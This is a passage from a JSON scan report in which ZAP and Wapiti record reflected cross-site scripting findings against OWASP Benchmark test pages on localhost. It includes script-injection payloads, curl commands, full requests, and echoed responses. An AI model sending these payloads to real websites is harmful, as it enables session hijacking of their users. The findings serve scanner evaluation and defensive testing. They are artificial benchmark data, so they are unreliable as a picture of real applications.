                    "ZAP - https://localhost:8444/benchmark/xss-04/BenchmarkTest02228?BenchmarkTest02228=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-04/BenchmarkTest02228?username=alice&password=Letm3in_&BenchmarkTest02228=%3CScRiPt%3Ealert%28%27wjpe3v1m62%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wjpe3v1m62')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wjpe3v1m62')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02228?username=alice&password=Letm3in_&BenchmarkTest02228=%3CScRiPt%3Ealert%28%27wjpe3v1m62%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02228.html?BenchmarkTest02228=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02228"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02228?BenchmarkTest02228=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02228.html?BenchmarkTest02228=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02228?username=alice&password=Letm3in_&BenchmarkTest02228=%3CScRiPt%3Ealert%28%27wjpe3v1m62%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '36', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:13 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>_SafeStuff'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '46', 'date': 'Sun, 31 Aug 2025 04:22:09 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wjpe3v1m62')</sCrIpT>_SafeStuff\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-04/BenchmarkTest02402?BenchmarkTest02402=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-04/BenchmarkTest02402?username=alice&password=Letm3in_&BenchmarkTest02402=%3CScRiPt%3Ealert%28%27wtwncxf8lw%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wtwncxf8lw')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wtwncxf8lw')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02402?username=alice&password=Letm3in_&BenchmarkTest02402=%3CScRiPt%3Ealert%28%27wtwncxf8lw%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02402.html\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02402"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02402?BenchmarkTest02402=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02402.html?BenchmarkTest02402=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02402?username=alice&password=Letm3in_&BenchmarkTest02402=%3CScRiPt%3Ealert%28%27wtwncxf8lw%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:13 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:22:11 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wtwncxf8lw')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-05/BenchmarkTest02487?BenchmarkTest02487=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-05/BenchmarkTest02487?username=alice&password=Letm3in_&BenchmarkTest02487=%3CScRiPt%3Ealert%28%27w5eikn750o%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w5eikn750o')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w5eikn750o')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02487?username=alice&password=Letm3in_&BenchmarkTest02487=%3CScRiPt%3Ealert%28%27w5eikn750o%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02487.html\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02487"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02487?BenchmarkTest02487=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02487.html?BenchmarkTest02487=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02487?username=alice&password=Letm3in_&BenchmarkTest02487=%3CScRiPt%3Ealert%28%27w5eikn750o%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '49', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:14 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Formatted like: <scrIpt>alert(1);</scRipt> and b.'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '59', 'date': 'Sun, 31 Aug 2025 04:22:12 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Formatted like: <ScRiPt>alert('w5eikn750o')</sCrIpT> and b.\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-05/BenchmarkTest02578?BenchmarkTest02578=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-05/BenchmarkTest02578?username=alice&password=Letm3in_&BenchmarkTest02578=%3CScRiPt%3Ealert%28%27wey53gc8t8%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wey53gc8t8')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wey53gc8t8')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02578?username=alice&password=Letm3in_&BenchmarkTest02578=%3CScRiPt%3Ealert%28%27wey53gc8t8%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02578.html?BenchmarkTest02578=SafeText\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02578"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02578?BenchmarkTest02578=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02578.html?BenchmarkTest02578=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02578?username=alice&password=Letm3in_&BenchmarkTest02578=%3CScRiPt%3Ealert%28%27wey53gc8t8%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:14 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:22:13 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wey53gc8t8')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-05/BenchmarkTest02579?BenchmarkTest02579=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP",
                    "Wapiti - https://localhost:8444/benchmark/xss-05/BenchmarkTest02579?username=alice&password=Letm3in_&BenchmarkTest02579=%3CScRiPt%3Ealert%28%27w0yjw6v4jw%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w0yjw6v4jw')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w0yjw6v4jw')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02579?username=alice&password=Letm3in_&BenchmarkTest02579=%3CScRiPt%3Ealert%28%27w0yjw6v4jw%27%29%3C%2FsCrIpT%3E\" -e \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02579.html\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02579"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02579?BenchmarkTest02579=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&password=ZAP&username=ZAP', 'method': 'GET', 'headers': {'cache-control': 'no-cache', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02579.html?BenchmarkTest02579=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02579?username=alice&password=Letm3in_&BenchmarkTest02579=%3CScRiPt%3Ealert%28%27w0yjw6v4jw%27%29%3C%2FsCrIpT%3E', 'method': 'GET', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}, 'body': {}}"
          ],
          "webResponse": [
